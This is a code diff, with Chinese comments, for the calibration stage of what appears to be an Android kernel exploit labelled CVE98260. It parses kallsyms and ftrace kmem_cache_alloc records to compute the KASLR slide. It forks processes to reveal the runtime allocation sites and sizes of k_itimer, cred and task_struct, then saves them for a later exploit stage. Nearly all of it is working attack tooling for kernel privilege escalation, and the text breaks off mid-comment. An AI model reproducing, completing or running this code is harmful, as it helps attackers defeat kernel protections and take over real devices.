@@ -65,6 +65,11 @@
 /* default candidate k_itimer sizes (PKJ110 6.6.118 and common 6.12.x variants) */
 static const uint64_t KITIMER_SIZE_DEFAULTS[] = {0x108, 0x100, 0x110, 0x118};
 
+/* task_struct 的 slab object_size 可能比 BTF 的 sizeof(struct task_struct) 大：
+ * CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进 task_struct（真机 6.18 实测
+ * 4736 + 1024 = 5760），厂商还可能再追加。所以尺寸搜索按一段区间走。 */
+#define TASK_SIZE_EXTRA_MAX 0x400U
+
 /* Scan range of solve_lmap.py: PKJ110 DRAM starts at 0x80000000,
  * linear map base = PAGE_OFFSET - 0x80000000, must scan below 0xFFFFFF8000000000 */
 #define SCAN_START UINT64_C(0xFFFFFF7E00000000)
@@ -388,6 +393,16 @@ static int cmp_u64_local(const void *a, const void *b)
  * 文件放在 $CVE98260_HOME/kallsyms.txt。 */
 static char *g_kallsyms_buf;
 
+/* sr_find_func() 是二分查找，要求符号表按 VA 升序；这里统一排一次。 */
+static int cmp_sr_sym_va(const void *a, const void *b)
+{
+	const sr_sym *x = a, *y = b;
+
+	if (x->va != y->va)
+		return (x->va < y->va) ? -1 : 1;
+	return strcmp(x->name ? x->name : "", y->name ? y->name : "");
+}
+
 static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
 {
 	char path[512];
@@ -437,15 +452,17 @@ static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
 		if (nl)
 			*nl = 0;
 		if (sscanf(p, "%llx %255s", &va, name) == 2) {
-			nstart = p + strspn(p, " \t");
-			/* 同一 VA 常有多个别名（_text/__pi__text…）：只保留第一个，
-			 * 否则「下一个符号」会算出 0 长度的函数。 */
-			if (n && arr[n - 1].va == (uint64_t)va) {
-				if (!nl)
-					break;
-				p = nl + 1;
-				continue;
-			}
+			/*
+			 * name 指针必须指向行内的**符号名**，不能是行首：
+			 * 行首是 VA（"0xffffffc08021104c do_timer_create"），
+			 * 早先写成 p + strspn(p, " \t") 时 strspn 匹配 0 个字符，
+			 * 于是 name 变成整行文本 —— 按名字查表的 kallsyms_lookup_name()
+			 * 因此从未匹配成功，文本 trace 那条交叉验证路径整条是死的。
+			 */
+			nstart = p;
+			while (*nstart && *nstart != ' ' && *nstart != '\t')
+				nstart++;
+			nstart += strspn(nstart, " \t");
 			if (n == cap) {
 				size_t ncap = cap ? cap * 2 : 8192;
 				sr_sym *na = (sr_sym *)realloc(arr, ncap * sizeof(sr_sym));
@@ -462,6 +479,25 @@ static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
 			break;
 		p = nl + 1;
 	}
+
+	/*
+	 * 按 VA 升序排序后再去重：
+	 *   · sr_find_func() 是二分查找，要求表按 VA 升序；
+	 *   · 同一 VA 常有多个别名（_text/__pi__text…），只保留第一个，
+	 *     否则「下一个符号」会算出 0 长度的函数。
+	 */
+	if (n > 1)
+		qsort(arr, n, sizeof(sr_sym), cmp_sr_sym_va);
+	{
+		size_t w = 0;
+
+		for (size_t i = 0; i < n; i++) {
+			if (w && arr[w - 1].va == arr[i].va)
+				continue;
+			arr[w++] = arr[i];
+		}
+		n = w;
+	}
 	if (!n) {
 		free(arr);
 		return -1;
@@ -471,104 +507,723 @@ static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
 	return 0;
 }
 
-/* 从文本 trace 里找一条 kmem_cache_alloc 记录，按 req（分配大小）过滤。
- * 返回 0 命中；func_out 拿到 func=xxx，site_out 拿到 call_site=0x...。 */
-static int trace_kmem_call_site(uint64_t want_req, char *func_out, size_t func_cap,
-				uint64_t *site_out)
+/* kallsyms 里按符号名精确查表（kallsyms.txt 的符号名没有类型前缀）。
+ * 返回 1 命中，0 未命中。 */
+static int kallsyms_lookup_name(const sr_sym *syms, size_t n, const char *name,
+				 uint64_t *out_va)
 {
-	FILE *f = fopen(TRACE "/trace", "r");
-	char line[2048];
-	int found = 0;
+	size_t i;
 
-	if (!f)
+	if (!name || !*name)
+		return 0;
+	for (i = 0; i < n; i++) {
+		if (syms[i].name && !strcmp(syms[i].name, name)) {
+			if (out_va)
+				*out_va = syms[i].va;
+			return 1;
+		}
+	}
+	return 0;
+}
+
+/*
+ * 同 kallsyms_lookup_name()，但额外给出命中条目在表里的下标。
+ * 调用方要拿符号名时必须用这个：syms[idx].name 指向 kallsyms 缓冲，
+ * 进程生命周期内有效；临时缓冲里的副本在函数返回后就是悬垂指针。
+ */
+static int kallsyms_find_name(const sr_sym *syms, size_t n, const char *name,
+			       size_t *out_idx, uint64_t *out_va)
+{
+	size_t i;
+
+	if (!name || !*name)
+		return 0;
+	for (i = 0; i < n; i++) {
+		if (syms[i].name && !strcmp(syms[i].name, name)) {
+			if (out_idx)
+				*out_idx = i;
+			if (out_va)
+				*out_va = syms[i].va;
+			return 1;
+		}
+	}
+	return 0;
+}
+
+/*
+ * 文本 trace 里的一条 kmem_cache_alloc 记录（已解析）。
+ *
+ * 真机 6.18 的格式：
+ *   call_site=dup_task_struct+0x54/0x498 ptr=... name=task_struct
+ *   bytes_req=5760 bytes_alloc=5760 gfp_flags=GFP_KERNEL node=-1 accounted=true
+ */
+#define TEXT_SITE_MAX 64
+
+struct text_site {
+	char     sym[64];   /* call_site= 的符号名（%pS 形式解析，或 6.6 的 func=） */
+	uint64_t off;       /* call_site= 的函数内偏移（仅 %pS 形式有意义） */
+	uint64_t req;       /* bytes_req = s->object_size */
+	char     cache[48]; /* slab cache 名（6.18 才有 name= 字段） */
+	uint64_t addr;      /* 非 0 = call_site 是**数值运行期地址**（6.6 形式） */
+};
+
+/*
+ * 扫文本 trace 里所有 bytes_req == want_req 的 kmem_cache_alloc 记录，
+ * 用每条记录的「符号名 + 函数内偏移」反推 slide，返回**第一个自洽**的候选。
+ *
+ * 6.18 的真实格式（真机实测 madrid / 6.18.21-android17）：
+ *   kmem_cache_alloc: call_site=do_timer_create+0xe8/0x508 ptr=00000000411047a6
+ *       name=posix_timers_cache bytes_req=384 bytes_alloc=384
+ *       gfp_flags=GFP_KERNEL|__GFP_ZERO node=-1 accounted=true
+ *
+ * 两个必须注意的点：
+ *   1. %pS 打印的是「符号名+0x函数内偏移/0x函数大小」，**没有数值地址**，
+ *      也没有 func= 字段 —— 数值 call_site 只能从 raw trace 取。
+ *   2. 真机实测 6.18 的调用点是 do_timer_create+0xe8，而 6.6 profile 写死的是
+ *      +0xa8，正好差 0x40 —— 这就是旧锚点在 6.18 上失效的原因。
+ *
+ * 自洽判据：slide ≡ 0 (mod 2 MiB) 且 0 <= slide < 2^42。
+ * 一个随机记录偶然满足的概率是 1/2 MiB，可以当噪声过滤用。
+ *
+ * ts / nts 是**探针结束后立刻**从文本 trace 采集的候选（见
+ * text_trace_collect_sites）：文本 buffer 是环形缓冲，等 raw 捕获跑完
+ * 再读，探针窗口的记录早就被系统级分配流量冲掉了。
+ */
+static int text_trace_slide_candidate(const sr_sym *syms, size_t n,
+				       const struct text_site *ts, int nts,
+				       uint64_t site,
+				       char *sym_out, size_t sym_cap,
+				       uint64_t *off_out, uint64_t *out_slide)
+{
+	size_t i;
+
+	if (!ts || nts <= 0)
 		return -1;
-	while (fgets(line, sizeof(line), f)) {
-		char *p;
-		unsigned long long site, req;
-		char func[256];
+	for (i = 0; i < (size_t)nts; i++) {
+		uint64_t off = ts[i].off, tva = 0, slide;
+		char sym[96];
+
+		/* 6.6 的数值形式给不出「符号 + 精确偏移」，用不了这条无假设的
+		 * 解法（offset 未知），留给 2 MiB 对齐法处理。 */
+		if (ts[i].addr)
+			continue;
+		snprintf(sym, sizeof(sym), "%s", ts[i].sym);
+		if (!kallsyms_lookup_name(syms, n, sym, &tva))
+			continue;
+		if (site < tva + off)
+			continue;
+		slide = site - tva - off;
+		if ((slide % SR_SLIDE_ALIGN) || slide >= SR_SLIDE_MAX)
+			continue;
+		snprintf(sym_out, sym_cap, "%s", sym);
+		*off_out = off;
+		*out_slide = slide;
+		return 0;
+	}
+	if (getenv("CVE98260_DEBUG_TEXT")) {
+		for (i = 0; i < (size_t)nts && i < 3u; i++) {
+			uint64_t tva = 0, slide = 0;
+
+			if (kallsyms_lookup_name(syms, n, ts[i].sym, &tva))
+				slide = site - tva - ts[i].off;
+			fprintf(stderr, "[calib_a] slide try: sym=%s tva=%#llx off=%#llx site=%#llx -> slide=%#llx align_ok=%d\n",
+				ts[i].sym, (unsigned long long)tva,
+				(unsigned long long)ts[i].off, (unsigned long long)site,
+				(unsigned long long)slide,
+				(slide % SR_SLIDE_ALIGN) ? 0 : 1);
+		}
+	}
+	return -1;
+}
+
+/* ------------------------------------------------------------------ *
+ * cred / task 分配点的运行期解析
+ * ------------------------------------------------------------------ */
+
+/* 函数名是否命中任一语义关键字 */
+static int name_has_any(const char *name, const char *const *keys, size_t n_keys)
+{
+	size_t i;
+
+	if (!name)
+		return 0;
+	for (i = 0; i < n_keys; i++)
+		if (keys[i] && strstr(name, keys[i]))
+			return 1;
+	return 0;
+}
+
+/* ------------------------------------------------------------------ *
+ * 文本 trace 采集
+ * ------------------------------------------------------------------ */
+
+/*
+ * 从文本 trace 里收集 kmem_cache_alloc 记录。
+ *
+ * filter_name 非空时按 cache 名精确匹配；want_req 非 0 时按 bytes_req 匹配。
+ * 两者都给 0 表示不过滤（收集前 N 条）。
+ *
+ * 必须**紧接着探针**调用：文本 buffer 是按 CPU 分的环形缓冲，系统级
+ * kmem_cache_alloc 流量很大，几秒就能把探针窗口的记录冲掉 —— 这正是
+ * 之前「文本 trace 交叉验证在真机从未触发」的原因（读的时候已经晚了）。
+ */
+static int text_trace_collect_sites(const char *filter_name, uint64_t want_req,
+				    struct text_site *out, int cap)
+{
+	FILE *f;
+	char line[1024];
+	int n = 0;
+
+	if (!out || cap <= 0)
+		return 0;
+	f = fopen(TRACE "/trace", "r");
+	if (!f)
+		return 0;
+	while (n < cap && fgets(line, sizeof(line), f)) {
+		char *p, *e;
+		unsigned long long req = 0;
+		struct text_site ts;
 
 		if (!strstr(line, "kmem_cache_alloc:"))
 			continue;
-		p = strstr(line, "call_site=0x");
-		if (!p || sscanf(p, "call_site=0x%llx", &site) != 1)
+
+		memset(&ts, 0, sizeof(ts));
+
+		/* name= */
+		p = strstr(line, "name=");
+		if (p) {
+			p += 5;
+			e = p;
+			while (*e && *e != ' ' && *e != '\n')
+				e++;
+			if ((size_t)(e - p) < sizeof(ts.cache)) {
+				memcpy(ts.cache, p, (size_t)(e - p));
+				ts.cache[e - p] = 0;
+			}
+		}
+		/* 尺寸：6.18 是 bytes_req=，6.6 是 req= */
+		p = strstr(line, "bytes_req=");
+		if (!p)
+			p = strstr(line, "req=");
+		if (p)
+			sscanf(p, "bytes_req=%llu", &req) ||
+				sscanf(p, "req=%llu", &req);
+		ts.req = (uint64_t)req;
+
+		if (filter_name && *filter_name &&
+		    (strcmp(ts.cache, filter_name) != 0))
 			continue;
-		p = strstr(line, "req=");
-		if (!p || sscanf(p, "req=%llu", &req) != 1)
+		if (want_req && ts.req != want_req)
 			continue;
-		if (req != want_req)
+
+		/* call_site：6.18 是 %pS 的 "FUNC+0xOFF/LEN"；6.6 是数值地址 + func= */
+		p = strstr(line, "call_site=");
+		if (!p)
 			continue;
-		p = strstr(line, "func=");
-		if (!p || sscanf(p, "func=%255s", func) != 1)
-			continue;
-		snprintf(func_out, func_cap, "%s", func);
-		*site_out = (uint64_t)site;
-		found = 1;
-		break;
+		p += 10;
+		e = p;
+		while (*e && *e != ' ' && *e != '\n')
+			e++;
+		{
+			char raw[sizeof(ts.sym) + 32];
+			size_t len = (size_t)(e - p);
+
+			if (len == 0 || len >= sizeof(raw))
+				continue;
+			memcpy(raw, p, len);
+			raw[len] = 0;
+			if (calib_parse_psym(raw, ts.sym, sizeof(ts.sym), &ts.off)) {
+				ts.addr = 0;
+			} else if (raw[0] == '0' && (raw[1] == 'x' || raw[1] == 'X')) {
+				/* 6.6 形式：call_site=0x<运行期地址> func=<符号名> */
+				ts.addr = strtoull(raw, NULL, 0);
+				p = strstr(line, "func=");
+				if (p) {
+					p += 5;
+					e = p;
+					while (*e && *e != ' ' && *e != '\n')
+						e++;
+					if ((size_t)(e - p) < sizeof(ts.sym)) {
+						memcpy(ts.sym, p, (size_t)(e - p));
+						ts.sym[e - p] = 0;
+					} else {
+						ts.sym[0] = 0;
+					}
+				} else {
+					ts.sym[0] = 0;
+				}
+			} else {
+				continue;
+			}
+		}
+
+		out[n++] = ts;
+		if (n == 1 && getenv("CVE98260_DEBUG_TEXT")) {
+			fprintf(stderr, "[calib_a] raw text line: %s", line);
+		}
 	}
 	fclose(f);
-	return found ? 0 : -1;
+	return n;
 }
 
-/* 用 kallsyms 精确解 slide，并把各分配点的运行期 call_site 落盘，
- * 供 exploit 阶段当 trace 匹配键（替代写死的 timer_link / cred_link）。 */
+/*
+ * 从文本 trace 里解析某个 slab cache 的运行期分配点。
+ *
+ * 文本 trace 比 raw trace 多给三样东西，正好补上 raw 的短板：
+ *   name=<cache>         —— cache 名（cred / task_struct），**不用猜尺寸**；
+ *   bytes_req=<n>        —— 该 cache 的 object_size
+ *                           （6.18: bytes_req = s->object_size，bytes_alloc = s->size）；
+ *   call_site=FUNC+0xOFF —— 符号名 + 函数内偏移。
+ *
+ * 于是运行期调用点可以直接算出来，不需要 raw trace：
+ *     runtime_site = kallsyms_va(FUNC) + slide + OFF
+ *
+ * 为什么 cred 的尺寸能对上、task_struct 对不上（真机 6.18 实测）：
+ *   cred        cache object_size = sizeof(struct cred) = 184  ← 与 BTF 一致
+ *   task_struct cache object_size = sizeof(struct task_struct) + THREAD_SIZE
+ *               （CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进 task_struct）
+ *               实测 4736(BTF) + 1024(THREAD_SIZE) = 5760，而 profile 记的是 4736。
+ * 所以 task_struct 的尺寸**只能运行期实测**，写死或从 BTF 推都会错。
+ *
+ * 返回 1 = 找到（*out_site 运行期 call_site，*out_size 该 cache 的 object_size）。
+ */
+static int resolve_alloc_site_by_name(const char *cache_name,
+				      const char *const *func_keywords,
+				      size_t n_func_keywords,
+				      const sr_sym *syms, size_t n, uint64_t slide,
+				      uint64_t *out_site, uint64_t *out_size,
+				      char *out_func, size_t out_func_cap)
+{
+	struct text_site ts[TEXT_SITE_MAX];
+	int nts, i;
+
+	*out_site = 0;
+	*out_size = 0;
+	if (out_func && out_func_cap)
+		out_func[0] = 0;
+
+	nts = text_trace_collect_sites(cache_name, 0, ts, TEXT_SITE_MAX);
+	for (i = 0; i < nts; i++) {
+		uint64_t tva = 0, site;
+		size_t idx = 0;
+		char sym[96];
+
+		snprintf(sym, sizeof(sym), "%s", ts[i].sym);
+		if (ts[i].addr) {
+			/* 6.6 形式：call_site 就是数值运行期地址，直接用 */
+			site = ts[i].addr;
+			if (!*sym)
+				continue;
+			if (!name_has_any(sym, func_keywords, n_func_keywords))
+				continue;
+			*out_site = site;
+			*out_size = ts[i].req;
+			if (out_func && out_func_cap)
+				snprintf(out_func, out_func_cap, "%s", sym);
+			return 1;
+		}
+		/* 符号名要能对上 kallsyms；LTO 可能带 .constprop.N 后缀 */
+		if (!kallsyms_find_name(syms, n, sym, &idx, &tva)) {
+			char *dot = strchr(sym, '.');
+
+			if (!dot)
+				continue;
+			*dot = 0;
+			if (!kallsyms_find_name(syms, n, sym, &idx, &tva))
+				continue;
+		}
+		/* 函数名要命中语义关键字 */
+		if (!name_has_any(sym, func_keywords, n_func_keywords))
+			continue;
+
+		site = tva + slide + ts[i].off;
+		if ((site >> 48) != 0xFFFFULL)
+			continue;
+		*out_site = site;
+		*out_size = ts[i].req;
+		if (out_func && out_func_cap)
+			snprintf(out_func, out_func_cap, "%s", syms[idx].name);
+		return 1;
+	}
+	return 0;
+}
+
+/*
+ * 在 raw trace 里解析某个 slab 尺寸的运行期分配点。
+ *
+ * 步骤：
+ *   1. 用布局自适应扫描器取出该尺寸的全部记录
+ *      （6.18 的 bytes_req = s->object_size，正好是 BTF 里的 sizeof）；
+ *   2. 按 call_site 聚类，出现最多的几个成为候选；
+ *   3. 每个候选用 slide 反算成未重定位地址，查 kallsyms 得到所属函数；
+ *   4. calib_pick_trusted_site() 做语义自证（函数名关键字 / 与 profile 锚点同函数）。
+ *
+ * 这是 resolve_alloc_site_by_name() 的兜底：文本 trace 被冲刷掉时，
+ * 仍能按「尺寸 + 调用点聚类 + 语义自证」把站点找回来。
+ *
+ * 返回 1 = 找到可信分配点（*out_site 为运行期 call_site，*out_func 为函数名）。
+ */
+static int resolve_alloc_site(const uint8_t *raw, size_t raw_len,
+			      const sr_sym *syms, size_t n,
+			      uint64_t slide, const uint64_t *sizes, size_t n_sizes,
+			      const char *const *keywords, size_t n_keywords,
+			      uint64_t anchor_link,
+			      uint64_t *out_site, uint64_t *out_size,
+			      char *out_func, size_t out_func_cap)
+{
+	struct calib_kmem_rec *recs = NULL;
+	struct calib_site_cand cands[32];
+	uint64_t *sites = NULL;
+	struct calib_run top[32];
+	size_t nrec = 0, n_top = 0, i, nc = 0;
+	uint64_t anchor_base = 0, anchor_len = 0;
+	int found = 0;
+
+	*out_site = 0;
+	*out_size = 0;
+	if (out_func && out_func_cap)
+		out_func[0] = 0;
+	if (!raw || !raw_len || !sizes || !n_sizes)
+		goto out;
+
+	recs = calib_scan_kmem_recs(raw, raw_len, sizes, n_sizes, &nrec);
+	if (!recs || !nrec)
+		goto out;
+	sites = malloc(nrec * sizeof(uint64_t));
+	if (!sites)
+		goto out;
+	for (i = 0; i < nrec; i++)
+		sites[i] = recs[i].site;
+	n_top = calib_top_values(sites, nrec, top, 32);
+	if (!n_top)
+		goto out;
+
+	/* profile 锚点（cred_link）所在的函数：允许 LTO 把 prepare_creds 内联走 */
+	if (anchor_link &&
+	    sr_find_func(syms, n, anchor_link, &anchor_base, &anchor_len, NULL) == 1) {
+		/* anchor_base / anchor_len 就绪 */
+	}
+
+	for (i = 0; i < n_top && nc < 32; i++) {
+		uint64_t site = top[i].value;
+		uint64_t unreloc, fbase = 0, flen = 0;
+		const char *fname = NULL;
+
+		if (site < slide)
+			continue;
+		unreloc = site - slide;
+		if (sr_find_func(syms, n, unreloc, &fbase, &flen, &fname) != 1)
+			continue;
+		cands[nc].site = site;
+		cands[nc].count = top[i].count;
+		cands[nc].func_base = fbase;
+		cands[nc].func_len = flen;
+		cands[nc].name_hit = name_has_any(fname, keywords, n_keywords);
+		nc++;
+	}
+	if (!nc)
+		goto out;
+
+	if (calib_pick_trusted_site(cands, nc, slide, anchor_base, anchor_len,
+				    out_site) == 1) {
+		found = 1;
+		for (i = 0; i < nrec; i++) {
+			if (recs[i].site != *out_site)
+				continue;
+			*out_size = recs[i].req;
+			break;
+		}
+		if (out_func && out_func_cap) {
+			uint64_t b = 0, l = 0;
+			const char *fname = NULL;
+
+			if (sr_find_func(syms, n, *out_site - slide, &b, &l, &fname) == 1 &&
+			    fname)
+				snprintf(out_func, out_func_cap, "%s", fname);
+		}
+	}
+out:
+	free(sites);
+	free(recs);
+	return found;
+}
+
+/*
+ * 第二段探针：cred 与 task_struct 的运行期分配点。
+ *
+ * calib_a 的第一段只造 k_itimer，窗口里不会出现 cred（prepare_creds）或
+ * task_struct（dup_task_struct）的分配，所以这两个尺寸的记录在第一段 raw
+ * trace 里根本没有 —— 6.18 上 cred_link / task_alloc_link 的运行期调用点
+ * 也因此无从谈起（实测 cred=0 task=0，exploit 只能退回「只按尺寸匹配」）。
+ *
+ * fork() 一次就同时触发两条路径：
+ *     copy_process() -> dup_task_struct()  -> task_struct slab 分配
+ *     copy_creds()  -> prepare_creds()     -> cred slab 分配
+ * 于是一个窗口里两个尺寸都有记录，调用点也就齐了。
+ */
+static void probe_fork_alloc(void)
+{
+	int i;
+
+	for (i = 0; i < 3; i++) {
+		pid_t pid = fork();
+		int status = 0;
+
+		if (pid == 0)
+			_exit(0);
+		if (pid < 0)
+			break;
+		waitpid(pid, &status, 0);
+	}
+}
+
+/*
+ * 跑第二段探针并把 cred / task 的运行期调用点落盘。
+ *
+ * 任何一步失败都只是「不写结果文件」——exploit 阶段会退回「只按尺寸匹配」的
+ * 旧行为（实测能跑通，只是匹配精度低），所以这里绝不改成硬失败。
+ */
+static void calib_a_probe_alloc_sites(const struct kernel_offsets *o,
+				      const sr_sym *syms, size_t n,
+				      uint64_t slide)
+{
+	static const char *const CRED_KEYWORDS[] = {
+		"prepare_creds", "copy_creds", "commit_creds", "cred",
+	};
+	static const char *const TASK_KEYWORDS[] = {
+		"dup_task_struct", "alloc_task_struct", "copy_process",
+		"task_struct", "fork",
+	};
+	struct raw_sink sink;
+	const char *paths[MAX_CPU_RAW];
+	char path_buf[MAX_CPU_RAW][64];
+	int npaths = 0, cpu;
+	uint64_t cred_site = 0, cred_size = 0, task_site = 0, task_size = 0;
+	char cred_func[96] = { 0 }, task_func[96] = { 0 };
+	int cred_ok = 0, task_ok = 0;
+	char buf[128];
+	/* task_struct 的 slab object_size 可能比 BTF 的 sizeof 大（THREAD_SIZE 内嵌），
+	 * 所以 raw 兜底时用一段尺寸区间去捞，而不是死抠一个数。 */
+	uint64_t task_sizes[TASK_SIZE_EXTRA_MAX / 0x40 + 1];
+	size_t n_task_sizes = 0;
+
+	if (!o || !syms || !n)
+		return;
+
+	calib_disarm();
+	set_buffer_kb("16384\n");
+	truncate_file(TRACE "/trace");
+	if (arm_kmem_event("kmem_cache_alloc")) {
+		fprintf(stderr, "[calib_a] warn: cannot re-arm kmem_cache_alloc, skip alloc-site probe\n");
+		return;
+	}
+	kick_rss();
+	truncate_file(TRACE "/trace");
+	write_file(TRACE "/tracing_on", "1\n");
+	probe_fork_alloc();
+	write_file(TRACE "/tracing_on", "0\n");
+	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
+	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
+
+	/*
+	 * 文本 trace 立刻读：它是按 CPU 分的环形缓冲，系统级 kmem_cache_alloc
+	 * 流量很大，等 raw 捕获跑完（最多 8 秒）再读，探针窗口的记录早没了。
+	 * 文本侧能按 cache 名精确定位（cred / task_struct），比按尺寸猜可靠得多。
+	 */
+	cred_ok = resolve_alloc_site_by_name("cred", CRED_KEYWORDS,
+					     sizeof(CRED_KEYWORDS) / sizeof(CRED_KEYWORDS[0]),
+					     syms, n, slide, &cred_site, &cred_size,
+					     cred_func, sizeof(cred_func));
+	task_ok = resolve_alloc_site_by_name("task_struct", TASK_KEYWORDS,
+					      sizeof(TASK_KEYWORDS) / sizeof(TASK_KEYWORDS[0]),
+					      syms, n, slide, &task_site, &task_size,
+					      task_func, sizeof(task_func));
+
+	/* 文本路径没拿到，才需要抓 raw 兜底 */
+	if (!cred_ok || !task_ok) {
+		for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
+			snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
+				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+			paths[cpu] = path_buf[cpu];
+			npaths++;
+		}
+		if (sink_init(&sink, TOTAL_CAP)) {
+			fprintf(stderr, "[calib_a] warn: out of memory for alloc-site probe\n");
+			return;
+		}
+		capture_raw(&sink, paths, npaths, 8);
+		fprintf(stdout, "[calib_a] alloc-site probe: raw=%zu bytes\n", sink.len);
+
+		if (!cred_ok && o->cred_size) {
+			uint64_t one = o->cred_size;
+
+			cred_ok = resolve_alloc_site(sink.buf, sink.len, syms, n, slide,
+						     &one, 1, CRED_KEYWORDS,
+						     sizeof(CRED_KEYWORDS) / sizeof(CRED_KEYWORDS[0]),
+						     o->cred_link, &cred_site, &cred_size,
+						     cred_func, sizeof(cred_func)) == 1;
+		}
+		if (!task_ok && o->task_struct_size) {
+			for (size_t i = 0; i <= TASK_SIZE_EXTRA_MAX / 0x40; i++)
+				task_sizes[n_task_sizes++] = o->task_struct_size + i * 0x40;
+			task_ok = resolve_alloc_site(sink.buf, sink.len, syms, n, slide,
+						     task_sizes, n_task_sizes, TASK_KEYWORDS,
+						     sizeof(TASK_KEYWORDS) / sizeof(TASK_KEYWORDS[0]),
+						     o->task_alloc_link, &task_site, &task_size,
+						     task_func, sizeof(task_func)) == 1;
+		}
+		free(sink.buf);
+	}
+
+	/* --- cred --- */
+	if (cred_ok) {
+		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)cred_site);
+		if (write_result_file("sites.cred", buf))
+			fprintf(stderr, "[calib_a] warn: cannot write sites.cred\n");
+		else
+			fprintf(stdout, "[calib_a] cred alloc site=%#llx (func=%s) -> sites.cred\n",
+				(unsigned long long)cred_site, cred_func[0] ? cred_func : "?");
+	} else {
+		fprintf(stderr, "[calib_a] note: cred call site unresolved, exploit matches cred by size only\n");
+	}
+
+	/* --- task_struct --- */
+	if (task_ok) {
+		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)task_site);
+		if (write_result_file("sites.task", buf))
+			fprintf(stderr, "[calib_a] warn: cannot write sites.task\n");
+		else
+			fprintf(stdout, "[calib_a] task alloc site=%#llx (func=%s) -> sites.task\n",
+				(unsigned long long)task_site, task_func[0] ? task_func : "?");
+		/*
+		 * task_struct 的 slab object_size 与 BTF 的 sizeof(struct task_struct)
+		 * 不相等（CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进去，真机 6.18 实测
+		 * 4736 + 1024 = 5760）。profile 里的值只能当下界用，所以把实测值
+		 * 落盘，让 exploit 阶段用它做尺寸窗口。
+		 */
+		if (task_size) {
+			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)task_size);
+			if (write_result_file("task_size.txt", buf))
+				fprintf(stderr, "[calib_a] warn: cannot write task_size.txt\n");
+			else
+				fprintf(stdout, "[calib_a] task_struct object_size=%#llx -> task_size.txt\n",
+					(unsigned long long)task_size);
+		}
+	} else {
+		fprintf(stderr, "[calib_a] note: task call site unresolved, exploit matches task by size only\n");
+	}
+}
+
+/*
+ * 6.18 适配：从 raw trace 里取 k_itimer 分配的运行期 call_site，
+ * 配合 kallsyms 精确解 KASLR slide，并把各分配点的运行期 call_site 落盘，
+ * 供 exploit 阶段当 trace 匹配键（替代写死的 timer_link / cred_link）。
+ *
+ * 数值 call_site 只能来自 raw trace（文本 trace 的 %pS 没有数值地址）。
+ * 解法有两条，都只用「raw 的数值地址 + kallsyms 的未重定位地址」：
+ *   a) 文本侧给出符号名与精确函数内偏移 → slide = site - F - off（无任何假设）
+ *   b) 2 MiB 对齐法：F = kallsyms 里覆盖 profile timer_link 的符号，
+ *      off = (site - F) mod 2 MiB（函数长度 < 2 MiB ⇒ off 唯一），
+ *      slide = site - F - off。
+ * 优先用 (a)（更精确，能识别 LTO 漂移），失败回退 (b)。
+ */
 static int calib_a_resolve_via_kallsyms(const struct kernel_offsets *o,
+					const sr_sym *syms, size_t n,
+					const struct text_site *ts, int nts,
+					const uint8_t *raw, size_t raw_len,
 					uint64_t *out_slide)
 {
-	sr_sym *syms = NULL;
-	size_t n = 0;
-	char func[256];
-	uint64_t site = 0, slide = 0, unreloc = 0;
-	int rc;
+	size_t nrec = 0, i;
+	struct calib_kmem_rec *recs = NULL;
+	uint64_t *sites = NULL;
+	struct calib_run top[4];
+	size_t n_top = 0;
+	uint64_t req = o ? o->kitimer_size : 0;
+	uint64_t site = 0, fbase = 0, flen = 0, slide = 0, off = 0;
+	const char *fname = NULL;
+	char tsym[192];
+	uint64_t toff = 0, tslide = 0;
 
-	if (!o || !o->kitimer_size)
+	if (!req || !raw || !raw_len)
 		return -1;
-	if (load_kallsyms_map(&syms, &n) != 0)
+	if (!syms || !n)
 		return -1;
 
-	if (trace_kmem_call_site(o->kitimer_size, func, sizeof(func), &site) != 0) {
-		fprintf(stderr, "[calib_a] text trace has no kmem_cache_alloc with req=%#llx\n",
-			(unsigned long long)o->kitimer_size);
+	/* 1) 数值 call_site：raw trace 里 bytes_req 命中且出现最频的那条 */
+	recs = calib_scan_kmem_recs(raw, raw_len, &req, 1, &nrec);
+	if (!recs || !nrec) {
+		fprintf(stderr, "[calib_a] raw trace has no kmem_cache_alloc with bytes_req=%#llx\n",
+			(unsigned long long)req);
 		goto fail;
 	}
-	fprintf(stdout, "[calib_a] trace: call_site=%#llx func=%s req=%#llx\n",
-		(unsigned long long)site, func, (unsigned long long)o->kitimer_size);
-
-	rc = sr_resolve_slide_named(syms, n, func, site, &slide, &unreloc);
-	if (rc != 1) {
-		fprintf(stderr, "[calib_a] kallsyms slide resolution failed (rc=%d)\n", rc);
+	sites = malloc(nrec * sizeof(uint64_t));
+	if (!sites)
+		goto fail;
+	for (i = 0; i < nrec; i++)
+		sites[i] = recs[i].site;
+	n_top = calib_top_values(sites, nrec, top, 4);
+	free(sites);
+	sites = NULL;
+	if (!n_top) {
+		fprintf(stderr, "[calib_a] no call site collected from raw trace\n");
 		goto fail;
 	}
-	fprintf(stdout, "[calib_a] resolved slide=%#llx (unrelocated call site %#llx)\n",
-		(unsigned long long)slide, (unsigned long long)unreloc);
+	site = top[0].value;
+	fprintf(stdout, "[calib_a] raw trace: %zu records with bytes_req=%#llx, dominant call_site=%#llx (%d hits)\n",
+		nrec, (unsigned long long)req, (unsigned long long)site, top[0].count);
 
-	/* 运行期调用点落盘：exploit 阶段用它们做 trace 匹配键 */
+	/* 2) 优先用文本 trace 的符号名 + 精确偏移（能识别 LTO 漂移） */
+	if (text_trace_slide_candidate(syms, n, ts, nts, site, tsym, sizeof(tsym),
+				       &toff, &tslide) == 0) {
+		slide = tslide;
+		fprintf(stdout, "[calib_a] text trace: call_site=%s+0x%llx -> slide=%#llx\n",
+			tsym, (unsigned long long)toff, (unsigned long long)slide);
+	} else {
+		/*
+		 * 文本候选没自洽：说明探针窗口里最先出现的那批同尺寸记录不是
+		 * k_itimer 的分配点（系统级分配会插队）。打印前几个候选便于定位，
